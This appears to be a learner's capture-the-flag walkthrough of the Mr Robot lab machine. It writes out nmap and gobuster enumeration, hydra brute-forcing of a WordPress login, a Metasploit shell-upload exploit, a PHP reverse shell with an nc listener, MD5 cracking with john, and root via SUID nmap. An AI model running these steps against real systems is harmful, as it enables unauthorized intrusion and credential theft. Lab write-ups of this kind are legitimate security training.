export ip=10.10.228.196

# information gathering
# tool - nmap
 - `sudo nmap -sS $ip`
   - Open ports 21, 22, 80
 - `nmap -sC -sV -oN nmap.log $ip`
   - 
   - 80: Apache/2.4.18
   - 22: OpenSSH 7.2p2

# tool - gobuster
 - `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`

# tool - hydra
 - hydra -L lists/usrname.txt -P lists/pass.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# process
 - tried robots.txt and it had a file name, so tried accessing that which had the first key. - 073403c8a58a1f80d943455fb30724b9
 - robots had another file name which when accessed a file was downloaded. the file content was a list of words.
 - trying to use hydra for bruteforcing wordpress login
 - tried different usernames for hydras -l option, but finally tried the username `elliot` as it is the name of mrrobot in $ip/wp-login.php?action=lostpassword and it showed the email couldn't be send message which confirms this is the username, nothing worked
   - this could have been done using hydra and the dictionary file we got. So bruteforcing becomes a 2 step process.
     - 1. `hydra -L fsociety.dic -p test` 
     - 2. `hydra -l <username> -P fsociety.dic`
     - eg: `hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
 - So then I went through all the files and dirs listed by gobuster with 200 as the status code, after hydra is finished, because if we run both simultaneously, it would crash the server
 - I went to $ip/readme which didn't have and checked the source, nothing peculiar, but then I went to $ip/license. in the source of this webpage I found one base64 encoded string, so decoded it and found it has what seemed like username:password format string. the username part had `elliot` so obviously I tried the password from this string on the wordpress login page and viola, we are in.
 - considering we have admin access for wordpress, we can upload a shell using this to gain access to the server, we will use metasploit for this.
   - We can use any reverse shell [example](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) and upload it from the theme editor in wordpress and access that url to get connected to the reverse shell
     - On the other side we can use rlwrap nc -lnvp 5432
   - using exploit `unix/webapp/wp_admin_shell_upload` and setting the relevant options as required
   - metasploit has a check for verifying the wordpress installtion, but considering the `/` of the $ip doesn't show wordpress home, we can disable this check using `set WPCHECK false` in msfconsole to make it work.
   - running th exploit shows it was not able to do it for some reason. So enabled httptracing for msfconsole using the command `set httptrace true` to see what is going on. This showed, the installation of the plugin was successful but activation failed. opened the wp admin panel's plugin page and it was indeed installed, so tried activating it manually. and it worked but it took more time than usual, this could be a timeout issue. setting the timeout for msfconsole to a higher value byt `set httpclienttimeout 60`
   - That worked, now we got the meterpreter session and looking at the home of the user robot, we see there are 2 files, the 2nd key and some password hash
   - Tried to view the key with no luck, not able to download thekey as well. So checked permissions and we don't have permissions, but it seems like we can read the hash file, so used `cat password.raw-md5` to get the hash.
   - `john --format=Raw-MD5 hash.txt` outputs `emarald`
   - But for some reason meterpreter is giving me so many issues, so I will just use the other shell method to get the reverse shell.
   - Got the shell using a php reverse shell(edit it with the ip of my system and `4444`) from pentest monkey and changed the content of one of the plugins by editing it from wordpress admin pabel
   - `$ip/wp-content/plugins/pluginname/pluginfile.php` is usually the url of the plugin files, so accessing that after running `rlwrap nc -lnvp 4444` will give you a shell
   - In that shell we will try `su robot` as that is what we require to see the content of the key2 file which inside the robots home dir.
   - Once we get that, we have to go priv escalation. For that we will run the command to see if there are any binaries with SUID set
     - `find / -perm -u=s -type f 2>/dev/nul`
     - here we see nmap has suid set, so nmap can actually spawn a root shell.
     - so starting nmap in interactive mode using `nmap --interactive` and then typing `!sh` will get you root shell using which you can go to root users home dir and see the 3rd and final answer.